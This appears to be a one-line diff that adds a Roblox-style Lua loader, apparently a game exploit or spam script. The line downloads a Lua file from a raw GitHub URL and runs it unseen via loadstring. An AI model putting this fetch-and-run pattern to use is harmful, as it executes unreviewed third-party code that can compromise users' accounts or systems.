@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/deltarune-fight-expanded-spam5-d8l0nfv6o5l4q1.lua"))()
